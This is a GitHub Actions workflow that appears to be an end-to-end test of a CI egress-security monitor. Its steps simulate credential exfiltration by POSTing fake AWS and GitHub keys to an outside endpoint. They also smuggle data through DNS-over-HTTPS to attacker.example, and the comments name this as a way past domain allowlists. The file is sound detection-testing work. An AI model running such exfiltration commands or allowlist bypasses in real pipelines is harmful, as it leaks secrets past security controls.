name: Runner Guard E2E Test

on:
  workflow_dispatch:
  push:
    branches: [main]
    paths:
      - '.github/workflows/runner-guard-test.yml'

jobs:
  guard:
    runs-on: ubuntu-latest
    permissions:
      contents: read

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Start Runner Guard
        id: guard
        uses: o3security/secure-runner@v1
        with:
          server_url: https://api.o3.security/graphql
          api_key: ${{ secrets.O3_API_KEY }}
          project_name: ${{ github.repository }}
          debug: "true"

      - name: Wait for guard to initialize
        run: sleep 12

      - name: Generate normal build traffic
        run: |
          # Normal egress — package registry + GitHub (baseline/trusted)
          curl -s -o /dev/null https://registry.npmjs.org/ || true
          curl -s -o /dev/null https://api.github.com/ || true

      - name: Exfiltrate a fake secret over TLS (detection target)
        run: |
          # Plant a fake AWS key + GitHub token and POST them to an unusual
          # destination so the guard's TLS secret-detection has something to
          # catch. These are NOT real credentials.
          FAKE_AWS="AKIAIOSFODNN7EXAMPLE"
          FAKE_GH="ghp_1234567890abcdefghijklmnopqrstuvwxyz"
          curl -s -o /dev/null -X POST "https://httpbin.org/post" \
            -H "Content-Type: application/json" \
            -d "{\"aws_key\":\"${FAKE_AWS}\",\"github_token\":\"${FAKE_GH}\"}" || true
          curl -s -o /dev/null https://example.com/ || true

      - name: DNS-over-HTTPS exfil (the Harden-Runner bypass)
        run: |
          # Smuggle data out via DoH to an ALLOWED resolver (dns.google). A
          # domain-allowlist tool sees a legit HTTPS connection and misses it.
          # Runner Guard reads the decrypted request and flags it. Not real data.
          curl -s -o /dev/null -X POST "https://dns.google/dns-query" \
            -H "Content-Type: application/dns-message" \
            --data-binary $'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' || true
          # GET/JSON DoH variant with data in the name= label
          curl -s -o /dev/null "https://cloudflare-dns.com/dns-query?name=ZXhmaWx0cmF0ZWQtc2VjcmV0.attacker.example" \
            -H "Accept: application/dns-json" || true

      - name: Let the guard capture
        run: sleep 8
